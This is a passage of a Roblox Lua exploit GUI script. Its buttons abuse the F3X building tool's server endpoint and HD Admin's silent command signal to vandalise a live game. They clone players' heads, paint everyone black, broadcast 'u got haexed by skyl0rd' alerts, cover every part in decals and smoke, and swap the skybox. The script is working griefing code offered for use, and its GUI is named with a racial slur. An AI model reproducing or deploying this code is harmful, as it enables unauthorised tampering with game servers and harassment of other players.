		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function ClonePart(part)
			local args = {
				[1] = "Clone",
				[2] = {
					[1] = part
				},
				[3] = workspace
			}
	
			_(args)
		end
	
		function clonehead(player)
			char = player.Character
			ClonePart(char.Head)
		end
	
		for i,v in game.Players:GetPlayers() do
			--spawn(function()
			pcall(function()
				clonehead(v)
			end)
			--end)
		end
		
	
		
		
		
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommand:InvokeServer(";untitle  all")
	
		RequestCommand:InvokeServer(";paint  all black")
		
	
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_6b);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_6d()
local script = G2L["6d"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommandSilent:InvokeServer(";alert all u should join team skyl0rd today!")
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_6d);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_6f()
local script = G2L["6f"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommandSilent:InvokeServer(";alert all hello skyl0rd speaking u just got rekted by us!")
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_6f);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_71()
local script = G2L["71"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommandSilent:InvokeServer(";title all hehe")
		RequestCommandSilent:InvokeServer(";titlebk all rekted")
		RequestCommandSilent:InvokeServer(";title all LOL")
		RequestCommandSilent:InvokeServer(";titlebk all da waffle!")
		RequestCommandSilent:InvokeServer(";title all u got haexed by skyl0rd")
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_71);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_73()
local script = G2L["73"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = workspace.Part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function AddFire(part)
			local args = {
				[1] = "CreateDecorations",
				[2] = {
					[1] = {
						["Part"] = part,
						["DecorationType"] = "Smoke"
					}
				}
			}
			_(args)
		end
		function FireParts()
			for i,v in game.Workspace:GetDescendants() do
				spawn(function()
					SetLocked(v,false)
					AddFire(v)
				end)
			end
		end
		FireParts()
	
	
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_73);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_75()
local script = G2L["75"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		-- made by 1sw0rd1 aka deletecar, DO NOT LEAK OR GIVE WITHOUT MY PERMISSION.
	
		id = 84142615535715
	
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
	
		function GetPartsFromSelection(Selection)
	
			local Parts = {}
	
	
			for _, Descendant in pairs(Selection:GetDescendants()) do
	
				if Descendant:IsA 'BasePart' and Descendant.Name ~= "Terrain" and Descendant.Name ~= "Sky" then
	
					Parts[#Parts + 1] = Descendant
	
				end
	
			end
	
	
			-- Return parts
	
			return Parts
	
		end
	
		local getfuckedlol = GetPartsFromSelection(game:GetService("Workspace"))
	
		function SpawnDecal(side)
			local shitass = {}
	
			for _, Part in pairs(getfuckedlol) do
				-- Create the change request for this part
	
				table.insert(shitass, { Part = Part, Face = side, TextureType = "Decal" });
			end;
	
	
			-- Send the change to the server
	
			remote:InvokeServer('CreateTextures', shitass);
		end
	
		function AddDecal(texture,side)
			local shitass = {}
	
			for _, Part in pairs(getfuckedlol) do
				-- Create the change request for this part
	
				table.insert(shitass, { Part = Part, Face = side, TextureType = "Decal", Texture = "rbxassetid://"..texture });
			end;
	
	
			-- Send the change to the server
	
			remote:InvokeServer('SyncTexture', shitass);
		end
	
		SpawnDecal(Enum.NormalId.Front)
		AddDecal(id,Enum.NormalId.Front)
	
		SpawnDecal(Enum.NormalId.Back)
		AddDecal(id,Enum.NormalId.Back)
	
		SpawnDecal(Enum.NormalId.Right)
		AddDecal(id,Enum.NormalId.Right)
	
		SpawnDecal(Enum.NormalId.Left)
		AddDecal(id,Enum.NormalId.Left)
	
		SpawnDecal(Enum.NormalId.Bottom)
		AddDecal(id,Enum.NormalId.Bottom)
	
		SpawnDecal(Enum.NormalId.Top)
		AddDecal(id,Enum.NormalId.Top)
	
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function spam()
			for i,v in game.workspace:GetDescendants() do
				if v:IsA("BasePart") then
					spawn(function()
						SetTrans(v,math.random(0,0))
					end)
				end
			end 
		end
		spam()
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommand:InvokeServer(";fogcolor black")
		wait(0.25)
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
	
	
	
			--HD transparent skybox by skyl0rd
			--LMAOOO
			--===--=-=-==-=DDDDDDDDDDDDDDDDD>>>>>>>>>>>>>>>>
			--++++++++++++
			-----------------========
			------------===================================
			-----------------==========
			------------=
			--=
			--=
	
	
	
	
	
	
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function Sky(id)
			e = char.HumanoidRootPart.CFrame.x
			f = char.HumanoidRootPart.CFrame.y
			g = char.HumanoidRootPart.CFrame.z
			CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
			for i,v in game.Workspace:GetDescendants() do
				if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
					--spawn(function()
					SetName(v,"Sky")
					AddMesh(v)
					--end)
					--spawn(function()
					SetMesh(v,"111891702759441")
					SetTexture(v,id)
					SetTrans(v, 0)
					MeshResize(v,Vector3.new(5000,5000,5000))
					SetLocked(v,true)
				end
			end
		end
		Sky("84142615535715")
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_75);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_77()
local script = G2L["77"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		-- made by 1sw0rd1 aka deletecar, DO NOT LEAK OR GIVE WITHOUT MY PERMISSION.
	
		id = 9422866248
	
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
	
		function GetPartsFromSelection(Selection)
	
			local Parts = {}
	
	
			for _, Descendant in pairs(Selection:GetDescendants()) do
	
				if Descendant:IsA 'BasePart' and Descendant.Name ~= "Terrain" and Descendant.Name ~= "Sky" then
	
					Parts[#Parts + 1] = Descendant
	
				end
	
			end
	
	
			-- Return parts
	
			return Parts
	
		end
	
		local getfuckedlol = GetPartsFromSelection(game:GetService("Workspace"))
	
		function SpawnDecal(side)
			local shitass = {}
	
			for _, Part in pairs(getfuckedlol) do
				-- Create the change request for this part
	
				table.insert(shitass, { Part = Part, Face = side, TextureType = "Decal" });
			end;
	
	
			-- Send the change to the server
	
			remote:InvokeServer('CreateTextures', shitass);
		end
	
		function AddDecal(texture,side)
			local shitass = {}
	
			for _, Part in pairs(getfuckedlol) do
				-- Create the change request for this part
	
				table.insert(shitass, { Part = Part, Face = side, TextureType = "Decal", Texture = "rbxassetid://"..texture });
			end;
	
	
			-- Send the change to the server
	
			remote:InvokeServer('SyncTexture', shitass);
		end
	
		SpawnDecal(Enum.NormalId.Front)
		AddDecal(id,Enum.NormalId.Front)
	
		SpawnDecal(Enum.NormalId.Back)
		AddDecal(id,Enum.NormalId.Back)
	
		SpawnDecal(Enum.NormalId.Right)
		AddDecal(id,Enum.NormalId.Right)
	
		SpawnDecal(Enum.NormalId.Left)
		AddDecal(id,Enum.NormalId.Left)
	
		SpawnDecal(Enum.NormalId.Bottom)
		AddDecal(id,Enum.NormalId.Bottom)
	
		SpawnDecal(Enum.NormalId.Top)
		AddDecal(id,Enum.NormalId.Top)
	
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function spam()
			for i,v in game.workspace:GetDescendants() do
				if v:IsA("BasePart") then
					spawn(function()
						SetTrans(v,math.random(0,0))
					end)
				end
			end 
		end
		spam()
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommand:InvokeServer(";fogcolor black")
		wait(0.25)
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
	
	
	
			--HD transparent skybox by skyl0rd
			--LMAOOO
			--===--=-=-==-=DDDDDDDDDDDDDDDDD>>>>>>>>>>>>>>>>
			--++++++++++++
			-----------------========
			------------===================================
			-----------------==========
			------------=
			--=
			--=
	
	
	
	
	
	
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
